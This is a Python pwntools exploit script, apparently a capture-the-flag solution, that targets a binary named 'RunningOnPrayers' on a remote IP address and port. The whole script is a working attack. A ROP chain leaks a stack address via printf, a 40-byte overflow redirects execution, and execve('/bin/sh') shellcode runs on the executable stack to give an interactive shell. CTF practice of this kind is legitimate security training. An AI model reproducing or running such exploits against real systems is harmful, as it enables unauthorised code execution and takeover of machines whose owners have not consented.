#!/usr/bin/python3
from pwn import *

e = ELF('./RunningOnPrayers')

context.binary = e

#p = process(e.path)
p = remote('18.212.207.74', 9001)

#can't pop rdi, finess good input for printf

rop = ROP(e)
rop.call(rop.ret)
rop.call(e.sym['gift'] + 1) #magically gives good leak
rop.call(rop.ret)
rop.printf()
rop.call(rop.ret)
rop.vuln()

log.info(rop.dump())

#gdb.attach(p)

p.sendlineafter(b'it', b'a' * 40 + rop.chain())

p.recvuntil(b'together')

stk = u64(p.recv(6).ljust(8, b'\x00')) + 0x2248

#stk rwx, ez clap

p.sendlineafter(b'it', b'a' * 40 + p64(stk + 0x8) + asm(shellcraft.execve('/bin/sh')))

log.info(f'stk: {hex(stk)}')

#pray for flag

p.interactive()
